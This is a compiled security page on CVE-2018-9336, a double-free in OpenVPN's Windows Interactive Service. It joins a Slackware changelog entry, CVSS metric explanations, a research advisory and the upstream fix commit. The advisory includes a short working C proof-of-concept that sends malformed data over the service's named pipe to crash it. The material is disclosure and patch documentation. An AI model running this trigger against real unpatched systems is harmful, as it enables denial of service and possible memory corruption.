Here are the details from the Slackware 14.2 ChangeLog: +--------------------------+ patches/packages/openvpn-2.4.6-i586-1_slack14.2.txz:  Upgraded.   This is a security update fixing a potential double-free() in Interactive   Service. This usually only leads to a process crash (DoS by an unprivileged   local account) but since it could possibly lead to memory corruption if   happening while multiple other threads are active at the same time,   CVE-2018-9336 has been assigned to acknowledge this risk.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

# [R1] OpenVPN Windows Service Double Free

High

[← View More Research Advisories](/security/research)
### Synopsis

Windows installations of OpenVPN are split into three parts:

1. OpenVPN Service (openvpnserv.exe)
2. Userland OpenVPN (openvpn.exe)
3. User Interface

The project is broken up in this way so that non-admin users can establish VPN connections. The user interface communicates with OpenVPN service over a pipe and the service spawns instances of *openvpn.exe* when escalated privileges are no longer needed.

A malicious user can send malformed data over the pipe in order to trigger a double free. Only providing a single NULL terminated string causes the service to drop into an error state that triggers the initial free of the *data* pointer in the function *GetStartupData*. However, a dangling pointer remains in the *GETSTARTUPDATA* struct. This dangling pointer is later freed during connection cleanup resulting in undefined behavior.

The following code can be used to reproduce the issue:

```

HANDLE pipeHandle = CreateFile(_T("\\\\.\\pipe\\openvpn\\service"), GENERIC_READ |
	GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
if (pipeHandle == INVALID_HANDLE_VALUE)
{
	return EXIT_FAILURE;
}

DWORD dwMode = PIPE_READMODE_MESSAGE;
if (!SetNamedPipeHandleState(pipeHandle, &dwMode, NULL, NULL))
{
	return EXIT_FAILURE;
}

DWORD rwTotal = 0;
WCHAR init_message[] = L"test";
if (!WriteFile(pipeHandle, init_message, sizeof(init_message), &rwTotal, NULL))
{
	return EXIT_FAILURE;
}

rwTotal = 0;

char data[1024] = { 0 };
bool success = false;
do
{
	success = ReadFile(pipeHandle, data, sizeof(data), &rwTotal, NULL);
	if (!success && GetLastError() != ERROR_MORE_DATA)
	{
		break;
	}
} while (!success);

return 0;

```

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix potential double-free() in Interactive Service ([CVE-2018-9336](https://github.com/advisories/GHSA-9p34-3252-9gh9 "CVE-2018-9336"))

[Browse files](/OpenVPN/openvpn/tree/1394192b210cb3c6624a7419bcf3ff966742e79b)
Browse the repository at this point in the history

```
Malformed input data on the service pipe towards the OpenVPN interactive
service (normally used by the OpenVPN GUI to request openvpn instances
from the service) can result in a double free() in the error handling code.

This usually only leads to a process crash (DoS by an unprivileged local
account) but since it could possibly lead to memory corruption if
happening while multiple other threads are active at the same time,
[CVE-2018-9336](https://github.com/advisories/GHSA-9p34-3252-9gh9 "CVE-2018-9336") has been assigned to acknowledge this risk.

Fix by ensuring that sud->directory is set to NULL in GetStartUpData()
for all error cases (thus not being free()ed in FreeStartupData()).

Rewrite control flow to use explicit error label for error exit.

Discovered and reported by Jacob Baines <jbaines@tenable.com>.
